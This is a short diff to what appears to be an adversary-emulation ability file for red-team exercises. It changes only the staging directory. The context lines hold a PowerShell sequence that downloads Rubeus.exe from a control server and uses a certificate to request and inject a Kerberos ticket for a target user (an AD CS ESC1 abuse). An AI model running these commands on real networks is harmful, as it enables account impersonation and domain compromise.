@@ -12,7 +12,7 @@
     windows:
       psh:
         command: |
-          cd "C:\Users\Public";
+          cd "#{env.dir.stage}";
           Invoke-WebRequest -Uri "#{server}/file/download" -Method POST -Headers @{"file" = "Rubeus.exe"} -OutFile "Rubeus.exe";
           .\Rubeus.exe asktgt /user:#{esc1.target_user} /certificate:"CN=#{esc1.target_user}" /ptt;
           klist | findstr.exe "#{esc1.target_user}";
